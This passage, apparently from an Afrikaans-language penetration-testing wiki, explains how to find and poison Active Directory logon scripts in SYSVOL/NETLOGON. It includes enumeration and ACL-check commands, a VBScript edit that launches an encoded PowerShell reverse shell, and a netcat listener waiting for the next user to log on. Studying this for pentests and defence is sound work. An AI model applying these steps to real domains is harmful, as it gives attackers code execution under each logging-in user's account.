Dieselfde patroon geld vir UNC-gehoste skrifte wat in `SYSVOL` opgespoor word:

- **Logon scripts** word gewoonlik in die **user**-konteks uitgevoer.
- **Startup scripts** word gewoonlik in die **computer / SYSTEM**-konteks uitgevoer.

As die skrifpad na ’n spoofbare gasheernaam wys, herlei die UNC-gasheer en bedien vervangende skrifinhoud vanaf die verwagte ligging.

## SYSVOL/NETLOGON Logon Script Poisoning

Skryfbare paaie onder `\\<dc>\SYSVOL\<domain>\scripts\` of `\\<dc>\NETLOGON\` laat toe dat daar met aanmeldingskrifte gepeuter word wat tydens gebruikersaanmelding via GPO uitgevoer word. Dit lewer kode-uitvoering in die sekuriteitskonteks van gebruikers wat aanmeld.

### Vind aanmeldingskrifte
- Inspekteer gebruikerskenmerke vir ’n opgestelde aanmeldingskrif:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Deursoek domeinshares om kortpaaie of verwysings na scripts bloot te lê:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Ontleed `.lnk`-lêers om teikens te bepaal wat na SYSVOL/NETLOGON wys (nuttige DFIR-truuk en vir aanvallers sonder direkte GPO-toegang):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound vertoon die gebruikerobjek se `scriptPath`-aanmeldingskripattribuut wanneer dit teenwoordig is. GPO-gekonfigureerde aanmeldingskripte is ’n aparte beleidsverwysing, so inspekteer ook die toepaslike GPO.

### Valideer skryftoegang (moenie op deellysinskrywings staatmaak nie)
Geoutomatiseerde nutsmiddels kan SYSVOL/NETLOGON as leesalleen aandui, selfs wanneer die presiese skrip ’n ander NTFS ACL het. Begin met leesalleen-inspeksie van daardie lêer en sy ouergids; ooreenstemmende Allow ACE’s bly kandidate, want effektiewe SMB- en NTFS-toegang, Deny ACE’s en die huidige token speel almal ’n rol:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

’n Gemagtigde skryftoets moet op ’n spesifieke teiken gerig en omkeerbaar wees, met die oorspronklike skrip gerugsteun en herstel. Moenie ’n werkende aanmeldskrip oorskryf net om toegang te toets nie; ’n suksesvolle skryfpoging kan met die volgende gebruiker se aanmelding uitgevoer word.

### Vergiftig ’n VBScript-aanmeldskrip vir RCE
Voeg ’n opdrag by wat ’n PowerShell-reverse shell begin (genereer dit vanaf revshells.com), en behou die oorspronklike logika om te voorkom dat die besigheidsfunksie ontwrig word:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Luister op jou gasheer en wag vir die volgende interaktiewe aanmelding:

```bash
rlwrap -cAr nc -lnvp 443
```

Notas:
- Uitvoering vind plaas onder die logging user se token (nie SYSTEM nie). Omvang is die GPO-skakel (OU, site, domain) waarop daardie script van toepassing is.
- Herstel die oorspronklike inhoud/timestamps ná gebruik.


## References

- [1] [Misbruik van Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Bevoorregte rekeninge en token privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Die ACL-aanvalspad-opdatering](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Voorregte eskaleer met ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skandering vir Active Directory-voorregte en bevoorregte rekeninge](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-attribuut/UAC-bewerkings vanaf Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (groeplidmaatskap)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL-misbruik, KeePassXC Argon2-kraking en DPAPI-dekripsie tot DC-admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: GPO UNC-paaie kaap vir kode-uitvoering en NTLM-relaying](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: uitbuiting van Active Directory-GPOs deur NTLM-relaying, en meer](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU wat pret maak? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: uitbuiting van ACL-aanvalvektore in verborge Organizational Units in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulering van wettige Active Directory-dienste op die netwerk: die geval van GPO-uitbuiting](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU-beweging en misbruik van geërfde ACLs](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
